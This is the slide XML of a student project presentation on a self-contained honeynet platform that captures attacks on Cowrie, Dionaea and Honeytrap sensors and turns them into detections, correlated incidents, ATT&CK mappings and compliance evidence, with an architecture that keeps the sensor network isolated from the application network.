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3035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spc="120">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHADOW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PARUL INSTITUTE OF ENGINEERING &amp; TECHNOLOGY  ·  PROJECT-II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38528"/>
            <a:ext cx="6675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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>A honeynet that</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="108000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr sz="4300" b="0">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>investigates itself.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13632"/>
            <a:ext cx="6355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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Honeypot-driven threat intelligence, detection and IOC enrichment — the whole pipeline on one laptop.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73168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773168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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>deceive · capture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4773168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4773168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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detect · correlate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4773168"/>
            <a:ext cx="2121408" cy="365760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8928" y="4773168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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>investigate ·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15584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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ayush Kumar Singh · Hetvi Patel · Nandini Upadhye · Malav Shah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7161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Guide: Dr. E. Kanniappan  ·  HOD: Prof. Ankita Gandhi  ·  Group PUCSE_2026_17  ·  2026–27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1207007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LIVE HONEYNET · EDGE → CORE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517904"/>
            <a:ext cx="2103120" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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7778" y="1693925"/>
            <a:ext cx="68580" cy="685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1517904"/>
            <a:ext cx="181051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cowrie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1517904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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>22 · 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2103120"/>
            <a:ext cx="2103120" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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67778" y="2279141"/>
            <a:ext cx="68580" cy="685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103120"/>
            <a:ext cx="181051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dionaea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2103120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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>445 · 21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688336"/>
            <a:ext cx="2103120" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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67778" y="2864358"/>
            <a:ext cx="68580" cy="685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79" y="2688336"/>
            <a:ext cx="181051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honeytrap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688336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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>80 · 8080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1722729"/>
            <a:ext cx="292608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72600" y="2307945"/>
            <a:ext cx="292608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372600" y="2893161"/>
            <a:ext cx="292608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59721" y="1728216"/>
            <a:ext cx="10972" cy="117043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65208" y="2307945"/>
            <a:ext cx="274320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939528" y="2103120"/>
            <a:ext cx="1536192" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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37826" y="2279141"/>
            <a:ext cx="68580" cy="68580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68128" y="2103120"/>
            <a:ext cx="12435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collector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02137" y="2523744"/>
            <a:ext cx="10972" cy="512064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676534" y="2748686"/>
            <a:ext cx="62179" cy="62179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39528" y="3035808"/>
            <a:ext cx="1536192" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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37826" y="3211829"/>
            <a:ext cx="68580" cy="68580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68128" y="3035808"/>
            <a:ext cx="12435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detection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811512" y="3840480"/>
            <a:ext cx="1792224" cy="676656"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21621"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4634A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02137" y="3456432"/>
            <a:ext cx="10972" cy="512063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676534" y="3681374"/>
            <a:ext cx="62179" cy="62179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939528" y="3968496"/>
            <a:ext cx="1536192" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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037826" y="4144518"/>
            <a:ext cx="68580" cy="68580"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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68128" y="3968496"/>
            <a:ext cx="12435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incident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62686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INC-000142 · HIGH · T1110 → T1059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69480" y="4846320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brute force → shell · risk 86 · explained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3" grpId="0"/>
      <p:bldP spid="14" grpId="0"/>
      <p:bldP spid="15" grpId="0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/>
      <p:bldP spid="23" grpId="0"/>
      <p:bldP spid="24" grpId="0" animBg="1"/>
      <p:bldP spid="25" grpId="0" animBg="1"/>
      <p:bldP spid="26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6" grpId="0" animBg="1"/>
      <p:bldP spid="37" grpId="0" animBg="1"/>
      <p:bldP spid="38" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0" animBg="1"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0" animBg="1"/>
      <p:bldP spid="44" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0" animBg="1"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48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Security operations you cannot practise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73936"/>
            <a:ext cx="5376672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29967"/>
            <a:ext cx="621792" cy="621792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eye-off_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185415"/>
            <a:ext cx="310896" cy="310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82495" y="2048255"/>
            <a:ext cx="40965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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nobody sees the attacks that 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5" y="2560320"/>
            <a:ext cx="409651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Textbook labs replay canned PCAPs. Real adversary behaviour — the scanning, the guessing, the first command after a login — never reaches the student.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73936"/>
            <a:ext cx="5376672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2029967"/>
            <a:ext cx="621792" cy="621792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alert__a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185415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214616" y="2048255"/>
            <a:ext cx="40965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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Alerts arrive without a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4616" y="2560320"/>
            <a:ext cx="409651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A tool says HIGH and stops there. Why it fired, what else it touched, and which stage of the attack it belongs to are left to the analyst.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30752"/>
            <a:ext cx="5376672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86784"/>
            <a:ext cx="621792" cy="621792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lock__a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142232"/>
            <a:ext cx="310896" cy="3108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682495" y="4005072"/>
            <a:ext cx="40965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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A SOC costs more than a lab has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82495" y="4517136"/>
            <a:ext cx="409651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SIEM licensing, sandbox subscriptions and threat-intel feeds put an end-to-end detection pipeline out of reach of a college project.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30752"/>
            <a:ext cx="5376672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986784"/>
            <a:ext cx="621792" cy="621792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clipboard__a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968" y="4142232"/>
            <a:ext cx="310896" cy="3108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214616" y="4005072"/>
            <a:ext cx="4096512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>
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Compliance evidence is collected by hand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4616" y="4517136"/>
            <a:ext cx="409651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Control evidence is screenshotted into spreadsheets once a year, so it is stale the day it is filed and traceable to nothing.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870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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Four symptoms, one cause: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>there is nowhere safe to watch a real attack unfold.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02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What this project set out to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A self-contained security operations platform that produces its own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55648"/>
            <a:ext cx="5138928" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 847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PROBLEM STATEMENT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57984"/>
            <a:ext cx="459028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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Design and implement a honeynet-driven platform that captures real attacker telemetry, converts it into explainable detections and incidents, and produces audit-grade evidence — without cloud services or paid tooling.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44768" y="1773936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6" y="175564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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri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83296" y="1746504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Run real honeypot sensors on an isolated network and ingest everything they observe, losslessly.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2322576"/>
            <a:ext cx="5376672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4768" y="249631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0256" y="2478024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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Normalise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2468880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Reduce three different sensor formats to one sensor-agnostic event schema, deduplicated by content.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3044952"/>
            <a:ext cx="5376672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44768" y="321868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3200400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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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83296" y="3191256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Evaluate declarative rules over that stream and raise detections that state their own reasoning.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3767328"/>
            <a:ext cx="5376672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3941063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3922776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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Correlate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3296" y="3913632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Group related detections into incidents with an explainable risk score and a reconstructed timeline.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4489704"/>
            <a:ext cx="5376672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4768" y="4663440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4645152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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Enrich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636008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Extract and enrich IOCs, map activity to MITRE ATT&amp;CK, and profile attacker behaviour from measured signals.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5212080"/>
            <a:ext cx="5376672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5385816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5367528"/>
            <a:ext cx="1417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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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83296" y="5358384"/>
            <a:ext cx="327355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Preserve evidence under chain of custody and generate reports whose every number traces to a query.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999232"/>
            <a:ext cx="5138928" cy="2340864"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3906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32004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SCOPE BOUNDARY — DECLARED UP FRONT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4564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in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39696" y="3438144"/>
            <a:ext cx="33649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deception, detection, correlation, investigation, reporting, GRC readiness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0782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out of scope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39696" y="4059936"/>
            <a:ext cx="33649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named-APT attribution, offensive tooling, production-scale throughput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0001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honesty rule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9696" y="4681728"/>
            <a:ext cx="336499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an unconfigured capability reports “not configured” — it never simulates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925312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mbria"/>
              </a:rPr>
              <a:t>Six objectives, one test of success: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>can a stranger verify every claim the platform makes?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03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30" grpId="0" animBg="1"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0" animBg="1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03 ·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Where the literature stops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22 papers surveyed across deception, detection engineering and SOC automation.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04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92224"/>
            <a:ext cx="3529584" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 303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9339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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DECEPTION RESEARCH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Oval 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="937260" y="2391156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2304288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High-interaction honeypots capture rich sessions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Oval 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="937260" y="3012948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2144" y="2926080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Deployment and containment patterns are well studied</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Oval 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="937260" y="3634739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52144" y="3547872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Datasets are published as raw logs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4224528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389120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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Stops at capture. The analytic layer is left to the reader.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1792224"/>
            <a:ext cx="3529584" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 303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199339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F59E0B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DETECTION ENGINEERING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Oval 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4622292" y="2391156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2304288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Sigma gave rules a portable grammar</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Oval 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4622292" y="3012948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37176" y="2926080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ATT&amp;CK gave findings a shared vocabulary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Oval 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4622292" y="3634739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7176" y="3547872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Coverage is measured per rule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1144" y="4224528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1144" y="4389120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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Assumes a SIEM already holds the data. The pipeline is out of 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1792224"/>
            <a:ext cx="3529584" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 303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1993392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0A5FA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SOC AUTOMATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Oval 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8307323" y="2391156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2304288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Correlation and triage reduce analyst load</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Oval 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8307323" y="3012948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22208" y="2926080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ML is applied to alert prioritisation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Oval 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8307323" y="3634739"/>
            <a:ext cx="64008" cy="64008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22208" y="3547872"/>
            <a:ext cx="279806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Explainability is a stated open problem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66175" y="4224528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66175" y="4389120"/>
            <a:ext cx="30358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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Evaluated on enterprise telemetry nobody outside the enterprise can obtain.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992624"/>
            <a:ext cx="10911535" cy="841248"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10869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515721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THE GAP THIS PROJECT FILLS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5376672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No open, single-machine system carries one event from a live honeypot all the way to a graded incident, an ATT&amp;CK mapping, a chain-of-custody record and a compliance control — with the reasoning preserved at every hop.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04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2048256"/>
            <a:ext cx="109115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23744"/>
            <a:ext cx="10424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700" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Let the attackers </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3700" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>write the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354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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Stand up real sensors. Let them be attacked. Turn what they see into detections, incidents and evidence —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4528" y="5431536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24528" y="5431536"/>
            <a:ext cx="12984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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>capture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577840" y="5632704"/>
            <a:ext cx="128016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05856" y="5431536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05856" y="5431536"/>
            <a:ext cx="12984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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>correlate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59168" y="5632704"/>
            <a:ext cx="128016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87184" y="5431536"/>
            <a:ext cx="1298448" cy="420624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87184" y="5431536"/>
            <a:ext cx="129844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34D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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05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 animBg="1"/>
      <p:bldP spid="7" grpId="0"/>
      <p:bldP spid="8" grpId="0" animBg="1"/>
      <p:bldP spid="9" grpId="0" animBg="1"/>
      <p:bldP spid="10" grpId="0"/>
      <p:bldP spid="11" grpId="0" animBg="1"/>
      <p:bldP spid="12" grpId="0" animBg="1"/>
      <p:bldP spid="13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04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One pipeline, eight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00784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195681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bug__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3" y="2093976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7824" y="26334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Deception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944368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Three attack-facing sensors on an isolated network capture SSH, SMB, FTP, MSSQL and HTTP intrusions.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700784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1" y="195681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4" name="Picture 13" descr="refresh__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72" y="2093976"/>
            <a:ext cx="274320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39311" y="26334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1" y="2944368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A cursor-based collector tails sensor output and normalises it into one schema, deduplicated by hash.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700784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95681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filter__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2093976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0" y="26334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44368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Declarative YAML rules evaluate the stream and emit detections carrying reason, confidence and ATT&amp;CK.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24544" y="1700784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62288" y="1956816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link__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9448" y="2093976"/>
            <a:ext cx="274320" cy="2743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162288" y="263347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62288" y="2944368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Related detections roll up into incidents with an explainable risk breakdown and a reconstructed timeline.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913632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7824" y="41696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Picture 28" descr="network__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3" y="4306824"/>
            <a:ext cx="274320" cy="2743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77824" y="4846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Behaviour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157216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A temporal interaction graph with real centrality classifies how the attacker worked — never who they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01568" y="3913632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39311" y="41696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Picture 33" descr="flask__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6472" y="4306824"/>
            <a:ext cx="274320" cy="2743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39311" y="4846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9311" y="5157216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Binary, APK and URL engines with YARA, ClamAV, secret detection and an egress-free sandbox shell.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63056" y="3913632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41696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clipboard__in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4306824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400800" y="4846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157216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49 SOC 2 criteria scored from 25 collectors that query the running system, plus an automated risk register.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24544" y="3913632"/>
            <a:ext cx="2615184" cy="2048256"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 446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62288" y="4169664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4" name="Picture 43" descr="file-check__acc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99448" y="4306824"/>
            <a:ext cx="274320" cy="274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9162288" y="4846320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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Reporting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5157216"/>
            <a:ext cx="217627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Eight report types rendered from live data, each stamped with provenance and a document hash.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23620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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Every capability reads the same normalised event stream — </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>one graph underneath all eight.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06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/>
      <p:bldP spid="16" grpId="0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/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0"/>
      <p:bldP spid="37" grpId="0" animBg="1"/>
      <p:bldP spid="38" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0" animBg="1"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47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05 ·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Two networks that never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Containment is architectural, not a configuration flag.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07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73936"/>
            <a:ext cx="3236976" cy="3749039"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3389"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="55000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="8E3B33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56816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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>HONEYNET_EDGE · ISOLATED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2249424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76121" y="2416302"/>
            <a:ext cx="68580" cy="685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6424" y="2249424"/>
            <a:ext cx="1005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cowrie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224942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SSH · Telnet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" y="2926080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6121" y="3092958"/>
            <a:ext cx="68580" cy="685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6424" y="2926080"/>
            <a:ext cx="1005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dionaea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2926080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SMB · FTP · MSSQL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" y="3602736"/>
            <a:ext cx="1298448" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15909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76121" y="3769614"/>
            <a:ext cx="68580" cy="6858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6424" y="3602736"/>
            <a:ext cx="100583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honeytrap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3602736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HTTP · generic TCP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407408"/>
            <a:ext cx="276148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00" b="0">
                <a:solidFill>
                  <a:srgbClr val="6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>No route to the app network. A compromised sensor reaches nothing.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5029200"/>
            <a:ext cx="28346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telemetry/raw/&lt;sensor&gt;/*.json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24865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read-only bind mount — the only crossing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652113"/>
            <a:ext cx="539496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5400000">
            <a:off x="4443984" y="3607308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0" y="1773936"/>
            <a:ext cx="4041648" cy="3749039"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2926"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="55000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2C6E58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1956816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34D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>HONEYNET_APP · APPLICATION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09744" y="2249424"/>
            <a:ext cx="3566160" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15217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08042" y="2425446"/>
            <a:ext cx="68580" cy="68580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38344" y="2249424"/>
            <a:ext cx="32735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backend · FastAPI (async)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74336" y="2798064"/>
            <a:ext cx="3401568" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15625"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="90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20640" y="279806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ourier New"/>
              </a:rPr>
              <a:t>collector + normaliser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74336" y="3163824"/>
            <a:ext cx="3401568" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15625"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="90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16382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ourier New"/>
              </a:rPr>
              <a:t>detection + correlation engine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74336" y="3529584"/>
            <a:ext cx="3401568" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15625"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="90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52958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ourier New"/>
              </a:rPr>
              <a:t>session · timeline · evidence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74336" y="3895344"/>
            <a:ext cx="3401568" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15625"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="90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389534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ourier New"/>
              </a:rPr>
              <a:t>compliance + risk engine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74336" y="4261104"/>
            <a:ext cx="3401568" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15625"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="90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20640" y="4261104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ourier New"/>
              </a:rPr>
              <a:t>report engine (WeasyPrint)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09744" y="4700016"/>
            <a:ext cx="1700784" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15909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08042" y="4866894"/>
            <a:ext cx="68580" cy="6858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38344" y="4700016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MariaDB 11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75120" y="4700016"/>
            <a:ext cx="1700784" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15909"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="95000"/>
            </a:srgbClr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773418" y="4866894"/>
            <a:ext cx="68580" cy="6858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03720" y="4700016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SSE → dashboard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06256" y="1773936"/>
            <a:ext cx="2651760" cy="3749039"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4137"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="55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25712" y="195681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SUPPORTING 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25712" y="2249424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nginx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2450592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static dashboard · 40 pages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25712" y="2779776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MobSF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25712" y="2980944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APK analysis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25712" y="3310128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ClamAV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25712" y="3511296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signature scanning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25712" y="3840479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Guacamole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5712" y="4041647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browser-streamed lab desktops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25712" y="4370831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analysis sandbox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25712" y="4571999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internal net · zero egress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25712" y="4901183"/>
            <a:ext cx="22128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phpMyAdmin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25712" y="5102351"/>
            <a:ext cx="22311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database inspection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mbria"/>
              </a:rPr>
              <a:t>Twelve containers by default, one </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>docker compose up</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t> — and the edge can never reach the core.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07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95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95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207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218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253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/>
      <p:bldP spid="17" grpId="0"/>
      <p:bldP spid="18" grpId="0" animBg="1"/>
      <p:bldP spid="19" grpId="0" animBg="1"/>
      <p:bldP spid="20" grpId="0"/>
      <p:bldP spid="21" grpId="0"/>
      <p:bldP spid="22" grpId="0"/>
      <p:bldP spid="23" grpId="0"/>
      <p:bldP spid="24" grpId="0"/>
      <p:bldP spid="25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 animBg="1"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0" animBg="1"/>
      <p:bldP spid="46" grpId="0" animBg="1"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48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06 ·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From a sensor write to a graded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Six hops. Every one of them records why it did what it did.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08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1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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4208" y="1956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bug__d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075688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1247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Capture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816352"/>
            <a:ext cx="133502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A sensor logs the connection, the credentials tried, the commands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9152" y="3048609"/>
            <a:ext cx="64007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2395727" y="3003803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87168" y="1810512"/>
            <a:ext cx="1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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199339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1296" y="1956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Picture 18" descr="refresh__wa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2075688"/>
            <a:ext cx="237744" cy="2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688336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88336" y="2816352"/>
            <a:ext cx="133502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inotify wakes the collector; a cursor marks how far each log was read.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048609"/>
            <a:ext cx="64008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4242816" y="3003803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334256" y="1810512"/>
            <a:ext cx="1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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35424" y="199339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58384" y="1956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" descr="layers__a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256" y="2075688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35424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Normalise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2816352"/>
            <a:ext cx="133502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Three formats become one schema; a content hash is the primary key.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53328" y="3048609"/>
            <a:ext cx="64007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Isosceles Triangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="6089904" y="3003803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81344" y="1810512"/>
            <a:ext cx="1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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199339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05472" y="1956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Picture 34" descr="filter__a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2075688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82512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Detect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816352"/>
            <a:ext cx="133502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Rules match the window and emit a detection with reason and confidence.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00416" y="3048609"/>
            <a:ext cx="64008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5400000">
            <a:off x="7936992" y="3003803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28431" y="1810512"/>
